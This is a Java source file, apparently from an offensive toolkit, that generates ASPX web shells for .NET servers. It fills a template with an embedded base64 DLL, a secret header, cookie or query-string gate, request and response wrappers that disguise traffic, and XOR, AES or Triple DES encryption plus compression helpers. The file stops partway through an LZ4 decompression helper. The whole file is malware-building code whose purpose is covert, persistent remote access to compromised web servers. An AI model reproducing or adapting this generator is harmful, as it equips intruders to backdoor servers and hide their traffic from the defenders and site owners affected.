package com.reajason.noone.core.generator;

import com.reajason.noone.core.generator.protocol.HttpProtocolMetadata;
import com.reajason.noone.core.generator.transform.TransformDirection;
import com.reajason.noone.core.transform.*;
import com.reajason.noone.server.profile.Profile;
import com.reajason.noone.server.profile.config.*;

import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.*;

/**
 * Generates ASPX web shells (.NET Standard 2.0) by filling stub methods in the template
 * with implementations derived from the Profile configuration.
 * <p>
 * This is the .NET counterpart of {@link NoOneWebShellGenerator}, which handles JSP/JSPX.
 *
 * @author ReaJason
 */
public class NoOneDotNetWebShellGenerator {

    private static final String ASPX_TEMPLATE_PATH = "/templates/dotnet/vul-dotnet-server.aspx";
    private static final String CORE_DLL_PATH = "/dotnet-core.dll";

    private final NoOneConfig config;

    public NoOneDotNetWebShellGenerator(NoOneConfig config) {
        this.config = Objects.requireNonNull(config, "config");
    }

    public String generateAspx() {
        String template = loadTemplate(ASPX_TEMPLATE_PATH);
        String filled = fillStubMethods(template);
        return insertExtras(filled);
    }

    // ==================== Template filling ====================

    private String fillStubMethods(String template) {
        String result = template;

        result = result.replace(
                "CoreDllBase64 = @\"\n\"",
                "CoreDllBase64 = @\"\n" + generateCoreDllBase64() + "\n\""
        );

        Profile profile = config.getProfile();
        if (profile == null) {
            return result;
        }

        result = result.replace(
                "    private bool IsAuthed()\n    {\n        return true;\n    }",
                generateIsAuthed(profile.getIdentifier())
        );

        ProtocolConfig protocolConfig = profile.getProtocolConfig();
        if (protocolConfig instanceof HttpProtocolConfig httpConfig) {
            result = result.replace(
                    "    private byte[] GetArgFromContent(byte[] content)\n    {\n        return content;\n    }",
                    generateGetArgFromContent(httpConfig.getRequestBodyType(), httpConfig.getRequestTemplate())
            );
            result = result.replace(
                    "    private byte[] WrapResData(byte[] data)\n    {\n        return data;\n    }",
                    generateWrapResData(httpConfig.getResponseBodyType(), httpConfig.getResponseTemplate())
            );
            result = result.replace(
                    "    private void WrapResponse()\n    {\n    }",
                    generateWrapResponse(httpConfig.getResponseStatusCode(), httpConfig.getResponseHeaders())
            );
        }

        TransformationSpec reqSpec = TransformationSpec.parse(profile.getRequestTransformations());
        TransformationSpec resSpec = TransformationSpec.parse(profile.getResponseTransformations());

        if (!isNone(reqSpec)) {
            String keyBase64 = computeKeyBase64(profile.getPassword(), reqSpec.encryption());
            result = result.replace(
                    "    private byte[] TransformReqPayload(byte[] payload)\n    {\n        return payload;\n    }",
                    generateTransformMethod("TransformReqPayload", "payload", TransformDirection.INBOUND, reqSpec, keyBase64)
            );
        }

        if (!isNone(resSpec)) {
            String keyBase64 = computeKeyBase64(profile.getPassword(), resSpec.encryption());
            result = result.replace(
                    "    private byte[] TransformResData(byte[] input)\n    {\n        return input;\n    }",
                    generateTransformMethod("TransformResData", "input", TransformDirection.OUTBOUND, resSpec, keyBase64)
            );
        }

        return result;
    }

    private String insertExtras(String content) {
        Profile profile = config.getProfile();
        if (profile == null) {
            return content;
        }

        TransformationSpec reqSpec = TransformationSpec.parse(profile.getRequestTransformations());
        TransformationSpec resSpec = TransformationSpec.parse(profile.getResponseTransformations());

        Set<String> needed = collectNeededHelpers(reqSpec, resSpec);
        if (needed.isEmpty()) {
            return content;
        }

        String importBlock = formatExtraImports(collectExtraImports(needed));
        String helperBlock = buildHelperMethodBlock(needed);

        String result = content;
        if (!importBlock.isEmpty()) {
            result = result.replace(
                    "<%@ Import Namespace=\"System.Text\" %>",
                    "<%@ Import Namespace=\"System.Text\" %>\n" + importBlock
            );
        }
        if (!helperBlock.isEmpty()) {
            result = result.replace(
                    "\n</script>",
                    "\n\n" + helperBlock + "\n</script>"
            );
        }
        return result;
    }

    // ==================== Core DLL generation ====================

    private String generateCoreDllBase64() {
        try (InputStream in = NoOneDotNetWebShellGenerator.class.getResourceAsStream(CORE_DLL_PATH)) {
            if (in == null) {
                throw new IllegalStateException("Core DLL not found: " + CORE_DLL_PATH);
            }
            byte[] dllBytes = in.readAllBytes();
            return formatMultiLineBase64(Base64.getEncoder().encodeToString(dllBytes));
        } catch (IOException e) {
            throw new IllegalStateException("Failed to read core DLL: " + CORE_DLL_PATH, e);
        }
    }

    private static String formatMultiLineBase64(String base64) {
        int lineWidth = 76;
        StringBuilder sb = new StringBuilder(base64.length() + base64.length() / lineWidth + 1);
        for (int i = 0; i < base64.length(); i += lineWidth) {
            if (i > 0) {
                sb.append('\n');
            }
            sb.append(base64, i, Math.min(i + lineWidth, base64.length()));
        }
        return sb.toString();
    }

    // ==================== IsAuthed ====================

    private String generateIsAuthed(IdentifierConfig identifier) {
        if (identifier == null) {
            return "    private bool IsAuthed()\n    {\n        return true;\n    }";
        }

        String name = escapeCSharp(identifier.getName());
        String value = escapeCSharp(identifier.getValue());
        IdentifierLocation location = identifier.getLocation();
        IdentifierOperator operator = identifier.getOperator() != null
                ? identifier.getOperator() : IdentifierOperator.EQUALS;

        StringBuilder sb = new StringBuilder();
        sb.append("    private bool IsAuthed()\n");
        sb.append("    {\n");

        if (location == IdentifierLocation.COOKIE) {
            sb.append("        System.Web.HttpCookie cookie = Request.Cookies[\"").append(name).append("\"];\n");
            sb.append("        if (cookie != null)\n");
            sb.append("        {\n");
            sb.append("            string v = cookie.Value;\n");
            sb.append("            return ").append(csharpOperatorExpr("v", operator, value)).append(";\n");
            sb.append("        }\n");
            sb.append("        return false;\n");
        } else {
            String getter;
            if (location == IdentifierLocation.QUERY_PARAM) {
                getter = "Request.QueryString[\"" + name + "\"]";
            } else {
                getter = "Request.Headers[\"" + name + "\"]";
            }
            sb.append("        string v = ").append(getter).append(";\n");
            sb.append("        return ").append(csharpOperatorExpr("v", operator, value)).append(";\n");
        }

        sb.append("    }");
        return sb.toString();
    }

    private static String csharpOperatorExpr(String var, IdentifierOperator op, String value) {
        return switch (op) {
            case EQUALS -> "string.Equals(" + var + ", \"" + value + "\", StringComparison.Ordinal)";
            case CONTAINS -> var + " != null && " + var + ".Contains(\"" + value + "\")";
            case STARTS_WITH -> var + " != null && " + var + ".StartsWith(\"" + value + "\", StringComparison.Ordinal)";
            case ENDS_WITH -> var + " != null && " + var + ".EndsWith(\"" + value + "\", StringComparison.Ordinal)";
        };
    }

    // ==================== GetArgFromContent ====================

    private String generateGetArgFromContent(HttpRequestBodyType bodyType, String template) {
        if (bodyType == null) {
            return "    private byte[] GetArgFromContent(byte[] content)\n    {\n        return content;\n    }";
        }

        HttpProtocolMetadata.PrefixSuffixIndexes indexes =
                HttpProtocolMetadata.calculateRequestBodyIndexes(bodyType, template);
        int prefix = indexes != null ? indexes.prefixLength() : 0;
        int suffix = indexes != null ? indexes.suffixLength() : 0;

        StringBuilder sb = new StringBuilder();
        sb.append("    private byte[] GetArgFromContent(byte[] content)\n");
        sb.append("    {\n");

        if (bodyType == HttpRequestBodyType.FORM_URLENCODED) {
            String paramName = HttpProtocolMetadata.extractParameterName(template);
            if (paramName == null) {
                paramName = "q";
            }
            sb.append("        string value = Request.Form[\"").append(escapeCSharp(paramName)).append("\"];\n");
            if (prefix == 0 && suffix == 0) {
                sb.append("        return Encoding.UTF8.GetBytes(value);\n");
            } else {
                sb.append("        return Encoding.UTF8.GetBytes(value.Substring(").append(prefix)
                        .append(", value.Length - ").append(prefix + suffix).append("));\n");
            }
        } else {
            if (prefix == 0 && suffix == 0) {
                sb.append("        return content;\n");
            } else {
                sb.append("        if (content == null || content.Length < ").append(prefix + suffix).append(") return new byte[0];\n");
                sb.append("        int payloadLen = content.Length - ").append(prefix).append(" - ").append(suffix).append(";\n");
                sb.append("        byte[] result = new byte[payloadLen];\n");
                sb.append("        System.Buffer.BlockCopy(content, ").append(prefix).append(", result, 0, payloadLen);\n");
                sb.append("        return result;\n");
            }
        }

        sb.append("    }");
        return sb.toString();
    }

    // ==================== Transform methods ====================

    private String generateTransformMethod(String methodName, String paramName,
                                           TransformDirection direction,
                                           TransformationSpec spec, String keyBase64) {
        StringBuilder sb = new StringBuilder();
        sb.append("    private byte[] ").append(methodName).append("(byte[] ").append(paramName).append(")\n");
        sb.append("    {\n");
        sb.append("        if (").append(paramName).append(" == null) return new byte[0];\n");
        sb.append("        try\n");
        sb.append("        {\n");
        sb.append("            byte[] data = ").append(paramName).append(";\n");

        boolean needsKey = spec.encryption() != null && spec.encryption() != EncryptionAlgorithm.NONE;
        if (needsKey) {
            sb.append("            byte[] key = Convert.FromBase64String(\"").append(keyBase64).append("\");\n");
        }

        if (direction == TransformDirection.INBOUND) {
            appendDecodeStep(sb, spec.encoding());
            appendDecryptStep(sb, spec.encryption());
            appendDecompressStep(sb, spec.compression());
        } else {
            appendCompressStep(sb, spec.compression());
            appendEncryptStep(sb, spec.encryption());
            appendEncodeStep(sb, spec.encoding());
        }

        sb.append("            return data;\n");
        sb.append("        }\n");
        sb.append("        catch (Exception)\n");
        sb.append("        {\n");
        sb.append("            throw;\n");
        sb.append("        }\n");
        sb.append("    }");
        return sb.toString();
    }

    private void appendDecodeStep(StringBuilder sb, EncodingAlgorithm encoding) {
        if (encoding == null || encoding == EncodingAlgorithm.NONE) return;
        String method = switch (encoding) {
            case BASE64 -> "DecodeBase64";
            case HEX -> "DecodeHex";
            case BIG_INTEGER -> "DecodeBigInteger";
            default -> null;
        };
        if (method != null) {
            sb.append("            data = ").append(method).append("(data);\n");
        }
    }

    private void appendEncodeStep(StringBuilder sb, EncodingAlgorithm encoding) {
        if (encoding == null || encoding == EncodingAlgorithm.NONE) return;
        String method = switch (encoding) {
            case BASE64 -> "EncodeBase64";
            case HEX -> "EncodeHex";
            case BIG_INTEGER -> "EncodeBigInteger";
            default -> null;
        };
        if (method != null) {
            sb.append("            data = ").append(method).append("(data);\n");
        }
    }

    private void appendDecryptStep(StringBuilder sb, EncryptionAlgorithm encryption) {
        if (encryption == null || encryption == EncryptionAlgorithm.NONE) return;
        String method = switch (encryption) {
            case XOR -> "Xor";
            case AES -> "AesDecrypt";
            case TRIPLE_DES -> "TripleDesDecrypt";
            default -> null;
        };
        if (method != null) {
            sb.append("            data = ").append(method).append("(data, key);\n");
        }
    }

    private void appendEncryptStep(StringBuilder sb, EncryptionAlgorithm encryption) {
        if (encryption == null || encryption == EncryptionAlgorithm.NONE) return;
        String method = switch (encryption) {
            case XOR -> "Xor";
            case AES -> "AesEncrypt";
            case TRIPLE_DES -> "TripleDesEncrypt";
            default -> null;
        };
        if (method != null) {
            sb.append("            data = ").append(method).append("(data, key);\n");
        }
    }

    private void appendDecompressStep(StringBuilder sb, CompressionAlgorithm compression) {
        if (compression == null || compression == CompressionAlgorithm.NONE) return;
        String method = switch (compression) {
            case GZIP -> "GzipDecompress";
            case DEFLATE -> "DeflateDecompress";
            case LZ4 -> "Lz4Decompress";
            default -> null;
        };
        if (method != null) {
            sb.append("            data = ").append(method).append("(data);\n");
        }
    }

    private void appendCompressStep(StringBuilder sb, CompressionAlgorithm compression) {
        if (compression == null || compression == CompressionAlgorithm.NONE) return;
        String method = switch (compression) {
            case GZIP -> "GzipCompress";
            case DEFLATE -> "DeflateCompress";
            case LZ4 -> "Lz4Compress";
            default -> null;
        };
        if (method != null) {
            sb.append("            data = ").append(method).append("(data);\n");
        }
    }

    // ==================== WrapResData ====================

    private String generateWrapResData(HttpResponseBodyType bodyType, String template) {
        HttpProtocolMetadata.ResponsePrefixSuffix parts =
                HttpProtocolMetadata.calculateResponseParts(bodyType, template);
        byte[] prefixBytes = parts != null ? parts.prefixBytes() : new byte[0];
        byte[] suffixBytes = parts != null ? parts.suffixBytes() : new byte[0];

        if (prefixBytes.length == 0 && suffixBytes.length == 0) {
            return "    private byte[] WrapResData(byte[] data)\n    {\n        return data;\n    }";
        }

        String prefixB64 = Base64.getEncoder().encodeToString(prefixBytes);
        String suffixB64 = Base64.getEncoder().encodeToString(suffixBytes);

        StringBuilder sb = new StringBuilder();
        sb.append("    private byte[] WrapResData(byte[] data)\n");
        sb.append("    {\n");

        if (prefixBytes.length > 0) {
            sb.append("        byte[] prefix = Convert.FromBase64String(\"").append(prefixB64).append("\");\n");
        } else {
            sb.append("        byte[] prefix = new byte[0];\n");
        }
        if (suffixBytes.length > 0) {
            sb.append("        byte[] suffix = Convert.FromBase64String(\"").append(suffixB64).append("\");\n");
        } else {
            sb.append("        byte[] suffix = new byte[0];\n");
        }

        sb.append("        byte[] result = new byte[prefix.Length + data.Length + suffix.Length];\n");
        sb.append("        int offset = 0;\n");
        sb.append("        if (prefix.Length > 0)\n");
        sb.append("        {\n");
        sb.append("            System.Buffer.BlockCopy(prefix, 0, result, 0, prefix.Length);\n");
        sb.append("            offset += prefix.Length;\n");
        sb.append("        }\n");
        sb.append("        System.Buffer.BlockCopy(data, 0, result, offset, data.Length);\n");
        sb.append("        offset += data.Length;\n");
        sb.append("        if (suffix.Length > 0)\n");
        sb.append("        {\n");
        sb.append("            System.Buffer.BlockCopy(suffix, 0, result, offset, suffix.Length);\n");
        sb.append("        }\n");
        sb.append("        return result;\n");
        sb.append("    }");
        return sb.toString();
    }

    // ==================== WrapResponse ====================

    private String generateWrapResponse(int statusCode, Map<String, String> headers) {
        if (statusCode <= 0 && (headers == null || headers.isEmpty())) {
            return "    private void WrapResponse()\n    {\n    }";
        }

        StringBuilder sb = new StringBuilder();
        sb.append("    private void WrapResponse()\n");
        sb.append("    {\n");

        if (statusCode > 0) {
            sb.append("        Response.StatusCode = ").append(statusCode).append(";\n");
        }
        if (headers != null) {
            for (Map.Entry<String, String> entry : headers.entrySet()) {
                sb.append("        Response.AddHeader(\"").append(escapeCSharp(entry.getKey()))
                        .append("\", \"").append(escapeCSharp(entry.getValue())).append("\");\n");
            }
        }

        sb.append("    }");
        return sb.toString();
    }

    // ==================== Helper method collection ====================

    private Set<String> collectNeededHelpers(TransformationSpec reqSpec, TransformationSpec resSpec) {
        Set<String> needed = new LinkedHashSet<>();
        collectForSpec(needed, reqSpec, TransformDirection.INBOUND);
        collectForSpec(needed, resSpec, TransformDirection.OUTBOUND);
        return needed;
    }

    private void collectForSpec(Set<String> out, TransformationSpec spec, TransformDirection direction) {
        if (isNone(spec)) return;

        CompressionAlgorithm compression = spec.compression();
        if (compression != null && compression != CompressionAlgorithm.NONE) {
            switch (compression) {
                case GZIP -> out.add(direction == TransformDirection.INBOUND ? "gzipDecompress" : "gzipCompress");
                case DEFLATE -> out.add(direction == TransformDirection.INBOUND ? "deflateDecompress" : "deflateCompress");
                case LZ4 -> out.add(direction == TransformDirection.INBOUND ? "lz4Decompress" : "lz4Compress");
                default -> {}
            }
        }

        EncryptionAlgorithm encryption = spec.encryption();
        if (encryption != null && encryption != EncryptionAlgorithm.NONE) {
            switch (encryption) {
                case XOR -> out.add("xor");
                case AES -> {
                    out.add(direction == TransformDirection.INBOUND ? "aesDecrypt" : "aesEncrypt");
                    out.add("cipherHelper");
                }
                case TRIPLE_DES -> {
                    out.add(direction == TransformDirection.INBOUND ? "tripleDesDecrypt" : "tripleDesEncrypt");
                    out.add("cipherHelper");
                }
                default -> {}
            }
        }

        EncodingAlgorithm encoding = spec.encoding();
        if (encoding != null && encoding != EncodingAlgorithm.NONE) {
            switch (encoding) {
                case BASE64 -> out.add(direction == TransformDirection.INBOUND ? "decodeBase64" : "encodeBase64");
                case HEX -> out.add(direction == TransformDirection.INBOUND ? "decodeHex" : "encodeHex");
                case BIG_INTEGER -> out.add(direction == TransformDirection.INBOUND ? "decodeBigInteger" : "encodeBigInteger");
                default -> {}
            }
        }
    }

    private Set<String> collectExtraImports(Set<String> needed) {
        Set<String> imports = new LinkedHashSet<>();

        if (needed.contains("cipherHelper")) {
            imports.add("System.Security.Cryptography");
        }
        if (needed.contains("decodeBigInteger") || needed.contains("encodeBigInteger")) {
            imports.add("System.Numerics");
        }
        if (needed.contains("gzipCompress") || needed.contains("gzipDecompress")
                || needed.contains("deflateCompress") || needed.contains("deflateDecompress")) {
            imports.add("System.IO.Compression");
        }

        return imports;
    }

    private String formatExtraImports(Set<String> imports) {
        if (imports.isEmpty()) return "";
        StringBuilder sb = new StringBuilder();
        for (String imp : imports) {
            sb.append("<%@ Import Namespace=\"").append(imp).append("\" %>\n");
        }
        // Remove trailing newline
        if (sb.length() > 0 && sb.charAt(sb.length() - 1) == '\n') {
            sb.setLength(sb.length() - 1);
        }
        return sb.toString();
    }

    // ==================== Helper method block generation ====================

    private String buildHelperMethodBlock(Set<String> needed) {
        if (needed.isEmpty()) return "";
        StringBuilder sb = new StringBuilder();

        if (needed.contains("decodeBase64")) append(sb, HELPER_DECODE_BASE64);
        if (needed.contains("encodeBase64")) append(sb, HELPER_ENCODE_BASE64);
        if (needed.contains("decodeHex")) append(sb, HELPER_DECODE_HEX);
        if (needed.contains("encodeHex")) append(sb, HELPER_ENCODE_HEX);
        if (needed.contains("decodeBigInteger")) append(sb, HELPER_DECODE_BIG_INTEGER);
        if (needed.contains("encodeBigInteger")) append(sb, HELPER_ENCODE_BIG_INTEGER);

        if (needed.contains("xor")) append(sb, HELPER_XOR);
        if (needed.contains("cipherHelper")) {
            append(sb, HELPER_CIPHER_ENCRYPT);
            append(sb, HELPER_CIPHER_DECRYPT);
        }
        if (needed.contains("aesEncrypt")) append(sb, HELPER_AES_ENCRYPT);
        if (needed.contains("aesDecrypt")) append(sb, HELPER_AES_DECRYPT);
        if (needed.contains("tripleDesEncrypt")) append(sb, HELPER_TRIPLE_DES_ENCRYPT);
        if (needed.contains("tripleDesDecrypt")) append(sb, HELPER_TRIPLE_DES_DECRYPT);

        if (needed.contains("gzipCompress")) append(sb, HELPER_GZIP_COMPRESS);
        if (needed.contains("gzipDecompress")) append(sb, HELPER_GZIP_DECOMPRESS);
        if (needed.contains("deflateCompress")) append(sb, HELPER_DEFLATE_COMPRESS);
        if (needed.contains("deflateDecompress")) append(sb, HELPER_DEFLATE_DECOMPRESS);
        if (needed.contains("lz4Compress")) append(sb, HELPER_LZ4_COMPRESS);
        if (needed.contains("lz4Decompress")) append(sb, HELPER_LZ4_DECOMPRESS);

        if (sb.isEmpty()) return "";
        while (sb.charAt(sb.length() - 1) == '\n') {
            sb.setLength(sb.length() - 1);
        }
        return sb.toString();
    }

    private static void append(StringBuilder sb, String method) {
        sb.append(method).append("\n\n");
    }

    // ==================== Utilities ====================

    private static String loadTemplate(String path) {
        try (InputStream in = NoOneDotNetWebShellGenerator.class.getResourceAsStream(path)) {
            if (in == null) {
                throw new IllegalStateException("Template not found: " + path);
            }
            return new String(in.readAllBytes(), StandardCharsets.UTF_8);
        } catch (IOException e) {
            throw new IllegalStateException("Failed to load template: " + path, e);
        }
    }

    private static boolean isNone(TransformationSpec spec) {
        if (spec == null) return true;
        return spec.compression() == CompressionAlgorithm.NONE
                && spec.encryption() == EncryptionAlgorithm.NONE
                && spec.encoding() == EncodingAlgorithm.NONE;
    }

    private static String computeKeyBase64(String password, EncryptionAlgorithm algorithm) {
        if (algorithm == null || algorithm == EncryptionAlgorithm.NONE) return "";
        String context = switch (algorithm) {
            case XOR -> "XOR";
            case AES -> "AES";
            case TRIPLE_DES -> "TripleDES";
            case NONE -> "";
        };
        byte[] key = TransformSupport.deriveKey(password, context, algorithm.keyLengthBytes());
        return Base64.getEncoder().encodeToString(key);
    }

    private static String escapeCSharp(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
                .replace("\t", "\\t");
    }

    // ==================== C# helper method source code ====================

    private static final String HELPER_DECODE_BASE64 = """
        private static byte[] DecodeBase64(byte[] input)
        {
            if (input == null || input.Length == 0) return new byte[0];
            string encoded = Encoding.UTF8.GetString(input);
            return Convert.FromBase64String(encoded);
        }""";

    private static final String HELPER_ENCODE_BASE64 = """
        private static byte[] EncodeBase64(byte[] input)
        {
            if (input == null || input.Length == 0) return new byte[0];
            string encoded = Convert.ToBase64String(input);
            return Encoding.UTF8.GetBytes(encoded);
        }""";

    private static final String HELPER_DECODE_HEX = """
        private static byte[] DecodeHex(byte[] input)
        {
            string s = Encoding.UTF8.GetString(input).Trim();
            if (s.Length == 0) return new byte[0];
            int len = s.Length / 2;
            byte[] output = new byte[len];
            for (int i = 0; i < len; i++)
            {
                int hi = Uri.FromHex(s[i * 2]);
                int lo = Uri.FromHex(s[i * 2 + 1]);
                output[i] = (byte)((hi << 4) | lo);
            }
            return output;
        }""";

    private static final String HELPER_ENCODE_HEX = """
        private static byte[] EncodeHex(byte[] input)
        {
            char[] hex = new char[input.Length * 2];
            int idx = 0;
            for (int i = 0; i < input.Length; i++)
            {
                int v = input[i] & 0xFF;
                hex[idx++] = "0123456789abcdef"[v >> 4];
                hex[idx++] = "0123456789abcdef"[v & 0x0F];
            }
            return Encoding.UTF8.GetBytes(new string(hex));
        }""";

    private static final String HELPER_DECODE_BIG_INTEGER = """
        private static byte[] DecodeBigInteger(byte[] input)
        {
            string s = Encoding.UTF8.GetString(input).Trim();
            if (s.Length == 0) return new byte[0];
            System.Numerics.BigInteger big = BigIntegerParseRadix(s, 36);
            byte[] withPrefix = big.ToByteArray();
            if (withPrefix.Length == 0) return new byte[0];
            System.Array.Reverse(withPrefix);
            int offset = 0;
            if (withPrefix[0] == 0 && withPrefix.Length > 1) offset = 1;
            if (withPrefix[offset] != 1) throw new InvalidOperationException("Invalid BigInteger payload");
            int outLen = withPrefix.Length - offset - 1;
            if (outLen <= 0) return new byte[0];
            byte[] output = new byte[outLen];
            System.Buffer.BlockCopy(withPrefix, offset + 1, output, 0, outLen);
            return output;
        }

        private static System.Numerics.BigInteger BigIntegerParseRadix(string value, int radix)
        {
            System.Numerics.BigInteger result = 0;
            for (int i = 0; i < value.Length; i++)
            {
                char c = value[i];
                int digit;
                if (c >= '0' && c <= '9') digit = c - '0';
                else if (c >= 'a' && c <= 'z') digit = c - 'a' + 10;
                else if (c >= 'A' && c <= 'Z') digit = c - 'A' + 10;
                else throw new FormatException("Invalid character: " + c);
                result = result * radix + digit;
            }
            return result;
        }""";

    private static final String HELPER_ENCODE_BIG_INTEGER = """
        private static byte[] EncodeBigInteger(byte[] input)
        {
            byte[] withPrefix = new byte[input.Length + 1];
            withPrefix[0] = 1;
            System.Buffer.BlockCopy(input, 0, withPrefix, 1, input.Length);
            byte[] littleEndian = new byte[withPrefix.Length + 1];
            System.Buffer.BlockCopy(withPrefix, 0, littleEndian, 0, withPrefix.Length);
            System.Array.Reverse(littleEndian, 0, withPrefix.Length);
            System.Numerics.BigInteger big = new System.Numerics.BigInteger(littleEndian);
            string s = BigIntegerToRadix(big, 36);
            return Encoding.UTF8.GetBytes(s);
        }

        private static string BigIntegerToRadix(System.Numerics.BigInteger value, int radix)
        {
            const string chars = "0123456789abcdefghijklmnopqrstuvwxyz";
            if (value == 0) return "0";
            System.Text.StringBuilder sb = new System.Text.StringBuilder();
            System.Numerics.BigInteger v = value;
            while (v > 0)
            {
                int rem = (int)(v % radix);
                sb.Insert(0, chars[rem]);
                v = v / radix;
            }
            return sb.ToString();
        }""";

    private static final String HELPER_XOR = """
        private static byte[] Xor(byte[] input, byte[] key)
        {
            if (key == null || key.Length == 0) return input;
            byte[] output = new byte[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                output[i] = (byte)(input[i] ^ key[i % key.Length]);
            }
            return output;
        }""";

    private static final String HELPER_CIPHER_ENCRYPT = """
        private static byte[] CipherEncrypt(SymmetricAlgorithm algo, int ivLen, byte[] plaintext, byte[] keyBytes)
        {
            algo.Key = keyBytes;
            algo.Mode = CipherMode.CBC;
            algo.Padding = PaddingMode.PKCS7;
            byte[] iv = new byte[ivLen];
            using (RandomNumberGenerator rng = RandomNumberGenerator.Create())
            {
                rng.GetBytes(iv);
            }
            algo.IV = iv;
            byte[] encrypted;
            using (ICryptoTransform encryptor = algo.CreateEncryptor())
            {
                encrypted = encryptor.TransformFinalBlock(plaintext, 0, plaintext.Length);
            }
            byte[] result = new byte[iv.Length + encrypted.Length];
            System.Buffer.BlockCopy(iv, 0, result, 0, iv.Length);
            System.Buffer.BlockCopy(encrypted, 0, result, iv.Length, encrypted.Length);
            return result;
        }""";

    private static final String HELPER_CIPHER_DECRYPT = """
        private static byte[] CipherDecrypt(SymmetricAlgorithm algo, int ivLen, byte[] ciphertextWithIv, byte[] keyBytes)
        {
            algo.Key = keyBytes;
            algo.Mode = CipherMode.CBC;
            algo.Padding = PaddingMode.PKCS7;
            byte[] iv = new byte[ivLen];
            System.Buffer.BlockCopy(ciphertextWithIv, 0, iv, 0, ivLen);
            algo.IV = iv;
            int cipherLen = ciphertextWithIv.Length - ivLen;
            byte[] encrypted = new byte[cipherLen];
            System.Buffer.BlockCopy(ciphertextWithIv, ivLen, encrypted, 0, cipherLen);
            using (ICryptoTransform decryptor = algo.CreateDecryptor())
            {
                return decryptor.TransformFinalBlock(encrypted, 0, encrypted.Length);
            }
        }""";

    private static final String HELPER_AES_ENCRYPT = """
        private static byte[] AesEncrypt(byte[] data, byte[] key)
        {
            using (Aes aes = Aes.Create())
            {
                return CipherEncrypt(aes, 16, data, key);
            }
        }""";

    private static final String HELPER_AES_DECRYPT = """
        private static byte[] AesDecrypt(byte[] data, byte[] key)
        {
            using (Aes aes = Aes.Create())
            {
                return CipherDecrypt(aes, 16, data, key);
            }
        }""";

    private static final String HELPER_TRIPLE_DES_ENCRYPT = """
        private static byte[] TripleDesEncrypt(byte[] data, byte[] key)
        {
            using (TripleDES des = TripleDES.Create())
            {
                return CipherEncrypt(des, 8, data, key);
            }
        }""";

    private static final String HELPER_TRIPLE_DES_DECRYPT = """
        private static byte[] TripleDesDecrypt(byte[] data, byte[] key)
        {
            using (TripleDES des = TripleDES.Create())
            {
                return CipherDecrypt(des, 8, data, key);
            }
        }""";

    private static final String HELPER_GZIP_COMPRESS = """
        private static byte[] GzipCompress(byte[] input)
        {
            using (MemoryStream output = new MemoryStream())
            {
                using (GZipStream gzip = new GZipStream(output, CompressionMode.Compress, true))
                {
                    gzip.Write(input, 0, input.Length);
                }
                return output.ToArray();
            }
        }""";

    private static final String HELPER_GZIP_DECOMPRESS = """
        private static byte[] GzipDecompress(byte[] input)
        {
            using (MemoryStream inputStream = new MemoryStream(input))
            using (GZipStream gzip = new GZipStream(inputStream, CompressionMode.Decompress))
            using (MemoryStream output = new MemoryStream())
            {
                byte[] buffer = new byte[4096];
                int read;
                while ((read = gzip.Read(buffer, 0, buffer.Length)) > 0)
                {
                    output.Write(buffer, 0, read);
                }
                return output.ToArray();
            }
        }""";

    private static final String HELPER_DEFLATE_COMPRESS = """
        private static byte[] DeflateCompress(byte[] input)
        {
            using (MemoryStream output = new MemoryStream())
            {
                using (DeflateStream deflate = new DeflateStream(output, CompressionMode.Compress, true))
                {
                    deflate.Write(input, 0, input.Length);
                }
                return output.ToArray();
            }
        }""";

    private static final String HELPER_DEFLATE_DECOMPRESS = """
        private static byte[] DeflateDecompress(byte[] input)
        {
            using (MemoryStream inputStream = new MemoryStream(input))
            using (DeflateStream deflate = new DeflateStream(inputStream, CompressionMode.Decompress))
            using (MemoryStream output = new MemoryStream())
            {
                byte[] buffer = new byte[4096];
                int read;
                while ((read = deflate.Read(buffer, 0, buffer.Length)) > 0)
                {
                    output.Write(buffer, 0, read);
                }
                return output.ToArray();
            }
        }""";

    private static final String HELPER_LZ4_COMPRESS = """
        private static byte[] Lz4Compress(byte[] input)
        {
            if (input == null || input.Length == 0) return new byte[0];
            int hashLog = 16;
            int hashSize = 1 << hashLog;
            int minMatch = 4;
            int maxDist = 0xFFFF;
            int[] table = new int[hashSize];
            for (int idx = 0; idx < hashSize; idx++) table[idx] = -1;
            MemoryStream output = new MemoryStream();
            int anchor = 0;
            int i = 0;
            int limit = input.Length - minMatch;
            while (i <= limit)
            {
                int h = ((input[i] & 0xFF) | ((input[i+1] & 0xFF) << 8)
                        | ((input[i+2] & 0xFF) << 16) | ((input[i+3] & 0xFF) << 24));
                h = (int)((uint)(h * unchecked((int)0x9E3779B1)) >> (32 - hashLog));
                int refIdx = table[h];
                table[h] = i;
                if (refIdx < 0 || (i - refIdx) > maxDist
                        || input[refIdx] != input[i] || input[refIdx+1] != input[i+1]
                        || input[refIdx+2] != input[i+2] || input[refIdx+3] != input[i+3])
                {
                    i++;
                    continue;
                }
                int matchLen = minMatch;
                int max = input.Length - i;
                while (matchLen < max && input[refIdx + matchLen] == input[i + matchLen]) matchLen++;
                int literalLen = i - anchor;
                int token = (Math.Min(literalLen, 15) << 4) | Math.Min(matchLen - minMatch, 15);
                output.WriteByte((byte)token);
                if (literalLen >= 15) { int n = literalLen - 15; while (n >= 255) { output.WriteByte(255); n -= 255; } output.WriteByte((byte)n); }
                if (literalLen > 0) output.Write(input, anchor, literalLen);
                int off = i - refIdx;
                output.WriteByte((byte)(off & 0xFF));
                output.WriteByte((byte)((off >> 8) & 0xFF));
                int matchExtra = matchLen - minMatch;
                if (matchExtra >= 15) { int n = matchExtra - 15; while (n >= 255) { output.WriteByte(255); n -= 255; } output.WriteByte((byte)n); }
                i += matchLen;
                anchor = i;
            }
            int lastLiterals = input.Length - anchor;
            int lastToken = Math.Min(lastLiterals, 15) << 4;
            output.WriteByte((byte)lastToken);
            if (lastLiterals >= 15) { int n = lastLiterals - 15; while (n >= 255) { output.WriteByte(255); n -= 255; } output.WriteByte((byte)n); }
            if (lastLiterals > 0) output.Write(input, anchor, lastLiterals);
            return output.ToArray();
        }""";

    private static final String HELPER_LZ4_DECOMPRESS = """
        private static byte[] Lz4Decompress(byte[] input)
        {
            if (input == null || input.Length == 0) return new byte[0];
            int minMatch = 4;
            byte[] output = new byte[Math.Max(64, input.Length * 4)];
            int outPos = 0;
            int inPos = 0;
            while (inPos < input.Length)
            {
                int token = input[inPos++] & 0xFF;
                int literalLen = token >> 4;
